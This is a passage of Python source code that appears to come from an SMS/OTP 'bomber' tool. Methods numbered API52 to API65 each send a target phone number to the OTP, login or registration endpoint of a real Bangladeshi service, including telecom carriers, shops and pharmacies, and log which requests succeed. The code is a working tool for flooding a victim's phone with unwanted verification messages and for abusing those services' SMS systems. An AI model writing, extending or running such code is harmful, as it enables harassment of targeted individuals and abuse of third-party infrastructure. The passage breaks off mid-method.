            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API52 - KFC BD", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API52 - KFC BD", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API52 - KFC BD", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api53_gp_offer_otp(self):
        target = self.target
        url = "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API53 - GP Offer OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API53 - GP Offer OTP": pass
            elif "Bioscope" in "API53 - GP Offer OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API53 - GP Offer OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API53 - GP Offer OTP": payload = {"phone": target}
            elif "Medha" in "API53 - GP Offer OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API53 - GP Offer OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API53 - GP Offer OTP": payload = {"phone_number": target}
            elif "Arogga" in "API53 - GP Offer OTP": payload = {"mobile": target}
            elif "MyGP" in "API53 - GP Offer OTP": pass
            elif "BDSTall" in "API53 - GP Offer OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API53 - GP Offer OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API53 - GP Offer OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API53 - GP Offer OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API53 - GP Offer OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API53 - GP Offer OTP": payload = {"mobile": target}
            elif "Kirei" in "API53 - GP Offer OTP": payload = {"phone": target}
            elif "Shikho" in "API53 - GP Offer OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API53 - GP Offer OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API53 - GP Offer OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API53 - GP Offer OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API53 - GP Offer OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api54_eonbazar_register(self):
        target = self.target
        url = "https://app.eonbazar.com/api/auth/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API54 - Eonbazar Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API54 - Eonbazar Register": pass
            elif "Bioscope" in "API54 - Eonbazar Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API54 - Eonbazar Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API54 - Eonbazar Register": payload = {"phone": target}
            elif "Medha" in "API54 - Eonbazar Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API54 - Eonbazar Register": payload = {"number": "+88" + target}
            elif "Robi" in "API54 - Eonbazar Register": payload = {"phone_number": target}
            elif "Arogga" in "API54 - Eonbazar Register": payload = {"mobile": target}
            elif "MyGP" in "API54 - Eonbazar Register": pass
            elif "BDSTall" in "API54 - Eonbazar Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API54 - Eonbazar Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API54 - Eonbazar Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API54 - Eonbazar Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API54 - Eonbazar Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API54 - Eonbazar Register": payload = {"mobile": target}
            elif "Kirei" in "API54 - Eonbazar Register": payload = {"phone": target}
            elif "Shikho" in "API54 - Eonbazar Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API54 - Eonbazar Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API54 - Eonbazar Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API54 - Eonbazar Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API54 - Eonbazar Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api55_eat_z(self):
        target = self.target
        url = "https://api.eat-z.com/auth/customer/app-connect"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API55 - Eat-Z": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API55 - Eat-Z": pass
            elif "Bioscope" in "API55 - Eat-Z": payload = {"number": "+88" + target}
            elif "Proiojon" in "API55 - Eat-Z": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API55 - Eat-Z": payload = {"phone": target}
            elif "Medha" in "API55 - Eat-Z": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API55 - Eat-Z": payload = {"number": "+88" + target}
            elif "Robi" in "API55 - Eat-Z": payload = {"phone_number": target}
            elif "Arogga" in "API55 - Eat-Z": payload = {"mobile": target}
            elif "MyGP" in "API55 - Eat-Z": pass
            elif "BDSTall" in "API55 - Eat-Z": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API55 - Eat-Z": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API55 - Eat-Z": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API55 - Eat-Z": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API55 - Eat-Z": payload = {"phoneNumber": target}
            elif "Sindabad" in "API55 - Eat-Z": payload = {"mobile": target}
            elif "Kirei" in "API55 - Eat-Z": payload = {"phone": target}
            elif "Shikho" in "API55 - Eat-Z": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API55 - Eat-Z": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API55 - Eat-Z", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API55 - Eat-Z", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API55 - Eat-Z", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api56_osudpotro(self):
        target = self.target
        url = "https://api.osudpotro.com/api/v1/users/send_otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API56 - Osudpotro": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API56 - Osudpotro": pass
            elif "Bioscope" in "API56 - Osudpotro": payload = {"number": "+88" + target}
            elif "Proiojon" in "API56 - Osudpotro": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API56 - Osudpotro": payload = {"phone": target}
            elif "Medha" in "API56 - Osudpotro": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API56 - Osudpotro": payload = {"number": "+88" + target}
            elif "Robi" in "API56 - Osudpotro": payload = {"phone_number": target}
            elif "Arogga" in "API56 - Osudpotro": payload = {"mobile": target}
            elif "MyGP" in "API56 - Osudpotro": pass
            elif "BDSTall" in "API56 - Osudpotro": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API56 - Osudpotro": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API56 - Osudpotro": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API56 - Osudpotro": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API56 - Osudpotro": payload = {"phoneNumber": target}
            elif "Sindabad" in "API56 - Osudpotro": payload = {"mobile": target}
            elif "Kirei" in "API56 - Osudpotro": payload = {"phone": target}
            elif "Shikho" in "API56 - Osudpotro": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API56 - Osudpotro": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API56 - Osudpotro", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API56 - Osudpotro", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API56 - Osudpotro", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api57_kormi24(self):
        target = self.target
        url = "https://api.kormi24.com/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API57 - Kormi24": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API57 - Kormi24": pass
            elif "Bioscope" in "API57 - Kormi24": payload = {"number": "+88" + target}
            elif "Proiojon" in "API57 - Kormi24": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API57 - Kormi24": payload = {"phone": target}
            elif "Medha" in "API57 - Kormi24": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API57 - Kormi24": payload = {"number": "+88" + target}
            elif "Robi" in "API57 - Kormi24": payload = {"phone_number": target}
            elif "Arogga" in "API57 - Kormi24": payload = {"mobile": target}
            elif "MyGP" in "API57 - Kormi24": pass
            elif "BDSTall" in "API57 - Kormi24": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API57 - Kormi24": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API57 - Kormi24": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API57 - Kormi24": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API57 - Kormi24": payload = {"phoneNumber": target}
            elif "Sindabad" in "API57 - Kormi24": payload = {"mobile": target}
            elif "Kirei" in "API57 - Kormi24": payload = {"phone": target}
            elif "Shikho" in "API57 - Kormi24": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API57 - Kormi24": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API57 - Kormi24", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API57 - Kormi24", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API57 - Kormi24", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api58_weblogin_gp(self):
        target = self.target
        url = "https://weblogin.grameenphone.com/backend/api/v1/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API58 - Weblogin GP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API58 - Weblogin GP": pass
            elif "Bioscope" in "API58 - Weblogin GP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API58 - Weblogin GP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API58 - Weblogin GP": payload = {"phone": target}
            elif "Medha" in "API58 - Weblogin GP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API58 - Weblogin GP": payload = {"number": "+88" + target}
            elif "Robi" in "API58 - Weblogin GP": payload = {"phone_number": target}
            elif "Arogga" in "API58 - Weblogin GP": payload = {"mobile": target}
            elif "MyGP" in "API58 - Weblogin GP": pass
            elif "BDSTall" in "API58 - Weblogin GP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API58 - Weblogin GP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API58 - Weblogin GP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API58 - Weblogin GP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API58 - Weblogin GP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API58 - Weblogin GP": payload = {"mobile": target}
            elif "Kirei" in "API58 - Weblogin GP": payload = {"phone": target}
            elif "Shikho" in "API58 - Weblogin GP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API58 - Weblogin GP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API58 - Weblogin GP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API58 - Weblogin GP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API58 - Weblogin GP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api59_shwapno(self):
        target = self.target
        url = "https://www.shwapno.com/api/auth"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API59 - Shwapno": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API59 - Shwapno": pass
            elif "Bioscope" in "API59 - Shwapno": payload = {"number": "+88" + target}
            elif "Proiojon" in "API59 - Shwapno": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API59 - Shwapno": payload = {"phone": target}
            elif "Medha" in "API59 - Shwapno": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API59 - Shwapno": payload = {"number": "+88" + target}
            elif "Robi" in "API59 - Shwapno": payload = {"phone_number": target}
            elif "Arogga" in "API59 - Shwapno": payload = {"mobile": target}
            elif "MyGP" in "API59 - Shwapno": pass
            elif "BDSTall" in "API59 - Shwapno": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API59 - Shwapno": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API59 - Shwapno": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API59 - Shwapno": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API59 - Shwapno": payload = {"phoneNumber": target}
            elif "Sindabad" in "API59 - Shwapno": payload = {"mobile": target}
            elif "Kirei" in "API59 - Shwapno": payload = {"phone": target}
            elif "Shikho" in "API59 - Shwapno": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API59 - Shwapno": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API59 - Shwapno", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API59 - Shwapno", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API59 - Shwapno", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api60_quizgiri(self):
        target = self.target
        url = "https://developer.quizgiri.xyz:443/api/v2.0/send-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API60 - Quizgiri": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API60 - Quizgiri": pass
            elif "Bioscope" in "API60 - Quizgiri": payload = {"number": "+88" + target}
            elif "Proiojon" in "API60 - Quizgiri": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API60 - Quizgiri": payload = {"phone": target}
            elif "Medha" in "API60 - Quizgiri": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API60 - Quizgiri": payload = {"number": "+88" + target}
            elif "Robi" in "API60 - Quizgiri": payload = {"phone_number": target}
            elif "Arogga" in "API60 - Quizgiri": payload = {"mobile": target}
            elif "MyGP" in "API60 - Quizgiri": pass
            elif "BDSTall" in "API60 - Quizgiri": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API60 - Quizgiri": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API60 - Quizgiri": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API60 - Quizgiri": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API60 - Quizgiri": payload = {"phoneNumber": target}
            elif "Sindabad" in "API60 - Quizgiri": payload = {"mobile": target}
            elif "Kirei" in "API60 - Quizgiri": payload = {"phone": target}
            elif "Shikho" in "API60 - Quizgiri": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API60 - Quizgiri": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API60 - Quizgiri", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API60 - Quizgiri", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API60 - Quizgiri", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api61_banglalink_mybl(self):
        target = self.target
        url = "https://myblapi.banglalink.net/api/v1/send-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API61 - Banglalink MyBL": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API61 - Banglalink MyBL": pass
            elif "Bioscope" in "API61 - Banglalink MyBL": payload = {"number": "+88" + target}
            elif "Proiojon" in "API61 - Banglalink MyBL": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API61 - Banglalink MyBL": payload = {"phone": target}
            elif "Medha" in "API61 - Banglalink MyBL": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API61 - Banglalink MyBL": payload = {"number": "+88" + target}
            elif "Robi" in "API61 - Banglalink MyBL": payload = {"phone_number": target}
            elif "Arogga" in "API61 - Banglalink MyBL": payload = {"mobile": target}
            elif "MyGP" in "API61 - Banglalink MyBL": pass
            elif "BDSTall" in "API61 - Banglalink MyBL": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API61 - Banglalink MyBL": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API61 - Banglalink MyBL": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API61 - Banglalink MyBL": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API61 - Banglalink MyBL": payload = {"phoneNumber": target}
            elif "Sindabad" in "API61 - Banglalink MyBL": payload = {"mobile": target}
            elif "Kirei" in "API61 - Banglalink MyBL": payload = {"phone": target}
            elif "Shikho" in "API61 - Banglalink MyBL": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API61 - Banglalink MyBL": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API61 - Banglalink MyBL", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API61 - Banglalink MyBL", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API61 - Banglalink MyBL", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api62_walton_plaza(self):
        target = self.target
        url = "https://api.waltonplaza.com.bd/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API62 - Walton Plaza": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API62 - Walton Plaza": pass
            elif "Bioscope" in "API62 - Walton Plaza": payload = {"number": "+88" + target}
            elif "Proiojon" in "API62 - Walton Plaza": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API62 - Walton Plaza": payload = {"phone": target}
            elif "Medha" in "API62 - Walton Plaza": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API62 - Walton Plaza": payload = {"number": "+88" + target}
            elif "Robi" in "API62 - Walton Plaza": payload = {"phone_number": target}
            elif "Arogga" in "API62 - Walton Plaza": payload = {"mobile": target}
            elif "MyGP" in "API62 - Walton Plaza": pass
            elif "BDSTall" in "API62 - Walton Plaza": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API62 - Walton Plaza": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API62 - Walton Plaza": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API62 - Walton Plaza": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API62 - Walton Plaza": payload = {"phoneNumber": target}
            elif "Sindabad" in "API62 - Walton Plaza": payload = {"mobile": target}
            elif "Kirei" in "API62 - Walton Plaza": payload = {"phone": target}
            elif "Shikho" in "API62 - Walton Plaza": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API62 - Walton Plaza": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API62 - Walton Plaza", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API62 - Walton Plaza", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API62 - Walton Plaza", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api63_pbs(self):
        target = self.target
        url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API63 - PBS": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API63 - PBS": pass
            elif "Bioscope" in "API63 - PBS": payload = {"number": "+88" + target}
            elif "Proiojon" in "API63 - PBS": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API63 - PBS": payload = {"phone": target}
            elif "Medha" in "API63 - PBS": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API63 - PBS": payload = {"number": "+88" + target}
            elif "Robi" in "API63 - PBS": payload = {"phone_number": target}
            elif "Arogga" in "API63 - PBS": payload = {"mobile": target}
            elif "MyGP" in "API63 - PBS": pass
            elif "BDSTall" in "API63 - PBS": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API63 - PBS": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API63 - PBS": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API63 - PBS": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API63 - PBS": payload = {"phoneNumber": target}
            elif "Sindabad" in "API63 - PBS": payload = {"mobile": target}
            elif "Kirei" in "API63 - PBS": payload = {"phone": target}
            elif "Shikho" in "API63 - PBS": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API63 - PBS": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API63 - PBS", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API63 - PBS", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API63 - PBS", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api64_aarong(self):
        target = self.target
        url = "https://mcprod.aarong.com/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API64 - Aarong": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API64 - Aarong": pass
            elif "Bioscope" in "API64 - Aarong": payload = {"number": "+88" + target}
            elif "Proiojon" in "API64 - Aarong": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API64 - Aarong": payload = {"phone": target}
            elif "Medha" in "API64 - Aarong": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API64 - Aarong": payload = {"number": "+88" + target}
            elif "Robi" in "API64 - Aarong": payload = {"phone_number": target}
            elif "Arogga" in "API64 - Aarong": payload = {"mobile": target}
            elif "MyGP" in "API64 - Aarong": pass
            elif "BDSTall" in "API64 - Aarong": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API64 - Aarong": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API64 - Aarong": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API64 - Aarong": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API64 - Aarong": payload = {"phoneNumber": target}
            elif "Sindabad" in "API64 - Aarong": payload = {"mobile": target}
            elif "Kirei" in "API64 - Aarong": payload = {"phone": target}
            elif "Shikho" in "API64 - Aarong": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API64 - Aarong": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API64 - Aarong", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API64 - Aarong", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API64 - Aarong", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api65_arogga_app(self):
        target = self.target
        url = "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API65 - Arogga App": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API65 - Arogga App": pass
            elif "Bioscope" in "API65 - Arogga App": payload = {"number": "+88" + target}
            elif "Proiojon" in "API65 - Arogga App": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API65 - Arogga App": payload = {"phone": target}
            elif "Medha" in "API65 - Arogga App": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API65 - Arogga App": payload = {"number": "+88" + target}
